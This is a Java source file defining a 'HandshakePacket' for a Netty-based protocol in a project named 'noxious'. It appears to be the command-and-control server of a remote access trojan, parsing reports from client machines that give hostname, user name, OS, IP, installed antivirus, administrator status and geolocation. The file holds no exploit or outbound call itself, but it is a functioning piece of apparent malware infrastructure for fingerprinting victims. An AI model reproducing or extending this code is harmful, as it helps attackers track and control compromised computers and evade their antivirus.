package org.noxious.packet.impl;

import io.netty.buffer.ByteBuf;
import org.noxious.netty.bytebuf.ByteBufWrapper;
import org.noxious.packet.DefinedPacket;

import java.util.StringJoiner;

public class HandshakePacket extends DefinedPacket {

    private int clientId;
    private String hostname;
    private String clientName;
    private String os;
    private String ip;
    private String antivirus;
    private boolean isAdmin;
    private String geoLocation;

    public HandshakePacket() {}

    public HandshakePacket(int clientId) {
        this.clientId = clientId;
    }
    // This constructor wont ever be used since this coherent design is meant for the client to input the packet data through a object for java, but we will be impl in C/C++
 /*
    public HandshakePacket(int clientId, String hostname, String clientName, String os, String ip, String antivirus, boolean isAdmin, String geoLocation) {
        this.clientId = clientId;
        this.hostname = hostname;
        this.clientName = clientName;
        this.os = os;
        this.ip = ip;
        this.antivirus = antivirus;
        this.isAdmin = isAdmin;
        this.geoLocation = geoLocation;
    }
*/
    @Override
    public void write(ByteBuf buf) throws Exception {
        ByteBufWrapper.writeVarInt(clientId, buf);
    }

    @Override
    public void read(ByteBuf buf) throws Exception {
        this.clientId = ByteBufWrapper.readVarInt(buf);
        this.hostname = ByteBufWrapper.readString(buf);
        this.clientName = ByteBufWrapper.readString(buf);
        this.os = ByteBufWrapper.readString(buf);
        this.ip = ByteBufWrapper.readString(buf);
        this.antivirus = ByteBufWrapper.readString(buf);
        int bool = ByteBufWrapper.readVarInt(buf);
        this.isAdmin = bool == 1;
        this.geoLocation = ByteBufWrapper.readString(buf);
    }


    public int getClientId() {
        return clientId;
    }

    public String getHostname() {
        return hostname;
    }

    public String getClientName() {
        return clientName;
    }

    public String getOs() {
        return os;
    }

    public String getIp() {
        return ip;
    }

    public String getAntivirus() {
        return antivirus;
    }

    public boolean isAdmin() {
        return isAdmin;
    }

    public String getGeoLocation() {
        return geoLocation;
    }

    @Override
    public String toString() {
        return new StringJoiner(", ", HandshakePacket.class.getSimpleName() + "[", "]")
                .add("clientId='" + clientId + "'")
                .add("hostname='" + hostname + "'")
                .add("clientName='" + clientName + "'")
                .add("os='" + os + "'")
                .add("ip='" + ip + "'")
                .add("antivirus='" + antivirus + "'")
                .add("isAdmin=" + isAdmin)
                .add("geoLocation='" + geoLocation + "'")
                .toString();
    }

    @Override
    public int getPacketId() {
        return 0x01;
    }
}
